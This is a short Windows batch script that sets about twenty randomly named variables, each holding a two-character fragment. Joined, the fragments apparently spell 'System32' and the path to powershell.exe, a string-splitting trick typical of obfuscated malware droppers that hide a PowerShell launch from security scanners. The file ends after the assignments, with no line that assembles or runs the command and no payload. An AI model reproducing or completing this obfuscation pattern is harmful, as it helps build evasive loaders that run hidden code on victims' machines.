@echo off
set "HkviroZnGu=do"
set "WtUxykbcav=em"
set "BFzGKowiNa=we"
set "LEfOBAUpWb=rs"
set "mNVpYgfaDH=y "
set "DrghaqzeXC=Po"
set "FUfZavsJsM=po"
set "OYxmkjmMIJ=Wi"
set "MfxwLInvDN=Sy"
set "RdUTaMmTSl=ow"
set "NfkWsKohtG=ll"
set "hnVgHMeumQ=he"
set "caiVCaPryz=.e"
set "wHPMVMFxir=32"
set "VOZCgKeDly=st"
set "AfPaaFuiwQ= /"
set "PUpdTzhOjL=ll"
set "JUchEknEtn=\v"
set "kiaNlDdZIn=0\"
set "QngEUfcZyI=nd"
set "BdNrEODNlG=xe"
